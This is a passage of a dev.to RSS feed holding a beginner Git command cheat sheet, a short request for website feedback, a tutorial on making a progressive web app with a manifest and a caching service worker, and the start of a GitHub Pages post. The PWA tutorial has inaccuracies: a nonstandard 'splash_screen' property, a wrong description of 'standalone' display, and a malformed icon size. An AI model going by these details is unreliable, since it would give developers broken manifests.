  &lt;/a&gt;
  Revert
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;We use revert when we want to do a new&lt;br&gt;
commit that undoes previous commits.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git reset --hard
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The --hard mode is not recoverable so if you want to recover your files after a git reset --hard, follow these steps &lt;a href="https://dev.to/danyson/how-to-recover-our-commit-after-a-git-reset-hard-14ij"&gt;How to recover our commit after a git reset --hard ?&lt;/a&gt; &lt;br&gt;
Other modes of reset -&amp;gt;&lt;code&gt;--soft, --mixed, --merge, --recurse-submodules&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git revert branch

git commit -a --amend //replaces previous commit

git checkout &amp;lt;commit_id&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#update"&gt;
  &lt;/a&gt;
  Update
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Update is when we want to bring changes to our files.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git fetch //from the original repo that you have forked
git fetch remote
git pull //fetch &amp;amp; merge
git am -3 patch.mbox
git apply patch.diff
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#publish"&gt;
  &lt;/a&gt;
  Publish
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Publish is when we want to establish what we done with our files.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git commit -a //adds all changed files &amp;amp; commits all changes
git format-patch origin //create set of diffs
git push remote //push to origin or remote
git tag //mark current version
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#view"&gt;
  &lt;/a&gt;
  View
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;View is when we want to see the informations about our files.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git status
git diff old_id new_id
git log -p file|dir
git blame file
git show id //meta data &amp;amp; diff
git show id:file
git branch //can list all branches both local and remote
git tag -l //shows list
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#branch"&gt;
  &lt;/a&gt;
  Branch
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;The "branch" helps you to create, delete, and list branches.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git checkout branch //switch working dir to branch
git merge branch //merge into current branch
git branch branch_name //branch current
git checkout -b new_branch another_branch //branch new branch from another branch and switch to new branch
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#conflict"&gt;
  &lt;/a&gt;
  Conflict
&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Conflict arises when two files of same name have different contents so we need to check the difference and maintain our code base without conflicts.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git diff [--base]
git diff --ours
git diff --theirs
git log --merge
gitk --merge
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#reference"&gt;
  &lt;/a&gt;
  Reference
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://git-scm.com/"&gt;git documentation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Personal blog&lt;/em&gt;&lt;/strong&gt;@&lt;a href="https://danyson.github.io/"&gt;danyson.github.io&lt;/a&gt;&lt;/p&gt;

</description>
      <category>git</category>
      <category>beginners</category>
      <category>computerscience</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Please give me advices how to improve site</title>
      <author>spoilt</author>
      <pubDate>Fri, 25 Jun 2021 22:10:07 +0000</pubDate>
      <link>https://dev.to/devhelper/please-give-me-advices-how-to-improve-site-396k</link>
      <guid>https://dev.to/devhelper/please-give-me-advices-how-to-improve-site-396k</guid>
      <description>&lt;p&gt;Please give me advices how to improve site &lt;a href="http://bit.ly/2nZoCig"&gt;http://bit.ly/2nZoCig&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks in advance!&lt;/p&gt;

</description>
      <category>html</category>
      <category>css3</category>
      <category>javascript</category>
      <category>wordpress</category>
    </item>
    <item>
      <title>How to make a PWA</title>
      <author>TheYoungestCoder</author>
      <pubDate>Fri, 25 Jun 2021 21:56:31 +0000</pubDate>
      <link>https://dev.to/theyoungestcoder/how-to-make-a-pwa-4m4n</link>
      <guid>https://dev.to/theyoungestcoder/how-to-make-a-pwa-4m4n</guid>
      <description>&lt;p&gt;This is part 3 of "Getting a 100% score in lighthouse". In this article I'll show you how to create PWA. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#get-started"&gt;
  &lt;/a&gt;
  Get started
&lt;/h2&gt;

&lt;p&gt;To create a PWA (progressive web app) you need to use a webmanifest. The first thing you need to do is create a file called &lt;code&gt;manifest.json&lt;/code&gt; and include this snippet inside the head of &lt;code&gt;index.html&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"manifest"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"manifest.json"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Since &lt;code&gt;manifest.json&lt;/code&gt; has many required properties to get your PWA working. I'll explain every one in-depth and how to implement them&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-name-endraw-raw-shortname-endraw-and-raw-description-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;short_name&lt;/code&gt;, and &lt;code&gt;description&lt;/code&gt;
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;short_name&lt;/code&gt; is what the user sees on their home screen. &lt;/li&gt;
&lt;li&gt;
&lt;code&gt;name&lt;/code&gt; and &lt;code&gt;description&lt;/code&gt; is what the user sees when installing the PWA&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#-raw-icons-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;icons&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;When a user installs your PWA, it uses an &lt;strong&gt;array&lt;/strong&gt; of icons to display on the home screen. Each icon is an object in which you need to specify the &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;src&lt;/code&gt;, and &lt;code&gt;sizes&lt;/code&gt; of each icon &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-starturl-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;start_url&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;This is the URL that is used when the user opens your app. It's typically &lt;code&gt;/&lt;/code&gt; or &lt;code&gt;index.html&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-themecolor-endraw-and-raw-backgroundcolor-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;theme_color&lt;/code&gt; and &lt;code&gt;background_color&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;This is pretty self-explanatory. It is worth noting that you have to use the HEX format.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#-raw-display-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;display&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;It describes how it's shown when your app is launched&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;fullscreen — the app runs in a fullscreen window&lt;/li&gt;
&lt;li&gt;standalone — the app runs in it's own window but still has a URL bar&lt;/li&gt;
&lt;li&gt;browser — the app runs in the browser&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#-raw-splashscreen-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;splash_screen&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;The splash screen is the image that appears when your app is launched. It is just in image so it requires &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;src&lt;/code&gt; and &lt;code&gt;sizes&lt;/code&gt; similar to an icon. &lt;/p&gt;

&lt;p&gt;Now that you know all the properties, here's an example for a news app webmanifest.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Newsella&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;short_name&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;News&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;start_url&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;theme_color&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#fff&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;background_color&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;#fff&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;display&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;standalone&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;description&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;One place for all of your news&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;icons&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;logo.png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;sizes&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;560xx560&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;image/png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;splash_screen&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;splash_screen.png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;sizes&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;800x100&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;type&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;image/png&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: iOS does not use the icons property and instead uses &lt;code&gt;&amp;lt;link rel="apple-touch-icon" href="your icon"&amp;gt;&lt;/code&gt;. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#service-workers"&gt;
  &lt;/a&gt;
  Service workers
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Service workers enable applications to control network requests, cache those requests to improve performance, and provide offline access to cached content.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To get a service worker setup you first need to create a file called &lt;code&gt;service-worker.js&lt;/code&gt;. Then, insert this snippet in your &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag inside &lt;code&gt;index.html&lt;/code&gt; to register the service worker.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;serviceWorker&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;navigator&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;navigator&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;serviceWorker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;service-worker.js&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This next snippet creates an array of files and caches them once it's installed. This allows your PWA to be usable offline. Include it in &lt;code&gt;service-worker.js&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cacheName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;app&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;filesToCache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;somefile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;anotherfile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;install&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;waitUntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cacheName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filesToCache&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;files cached&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;})()&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next, what you need to do is intercept any requests. If it's cached, simply return the already-cached value. Otherwise, fetch the file, then cache it. It's expressed with this code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;fetch&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;respondWith&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// check if it's already cached&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cachedFile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;requesting resource:&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cachedFile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;cachedFile&lt;/span&gt;

        &lt;span class="c1"&gt;// if not, fetch then cache&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;cache&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;caches&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cacheName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;caching resource:&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;clone&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;response&lt;/span&gt;
    &lt;span class="p"&gt;})())&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#youre-done"&gt;
  &lt;/a&gt;
  You're done!
&lt;/h2&gt;

&lt;p&gt;You've successfully made a PWA! If you need help, I included some debugging tips below. If that didn't solve the issue, post the error in the comments. Thanks for reading, I hope this helped you.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging"&gt;
  &lt;/a&gt;
  Debugging
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Failed to execute 'Cache' on 'addAll'&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This occurs when a file attempts to be cached that doesn't exist. Make sure that the files have the correct path in the &lt;code&gt;filesToCache&lt;/code&gt; array.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Service Worker Registration Failed&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This happens when &lt;code&gt;service-worker.js&lt;/code&gt; doesn't exist.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Manifest property 'start_url' ignored, url is invalid&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Make sure that it points to the location of the actual HTML file for your app.&lt;/p&gt;

</description>
      <category>webdev</category>
    </item>
    <item>
      <title>Multiple Environments With GitHub Pages</title>
      <author>mkt</author>
      <pubDate>Fri, 25 Jun 2021 21:05:46 +0000</pubDate>
      <link>https://dev.to/mktcode/multiple-environments-with-github-pages-53me</link>
      <guid>https://dev.to/mktcode/multiple-environments-with-github-pages-53me</guid>
      <description>&lt;h1&gt;
  &lt;a href="#or-when-youre-working-on-a-static-site-and-github-pages-feels-like-the-perfect-hosting-solution-since-you-like-having-everything-in-one-place-and-then-you-realize-you-need-an-additional-environment-but-you-still-dont-want-to-use-anything-but-github-heres-what-you-can-do"&gt;
  &lt;/a&gt;
  or... When you’re working on a static site and GitHub Pages feels like the perfect hosting solution, since you like having everything in one place and then you realize you need an additional environment but you still don’t want to use anything but GitHub… Here’s what you can do.
&lt;/h1&gt;

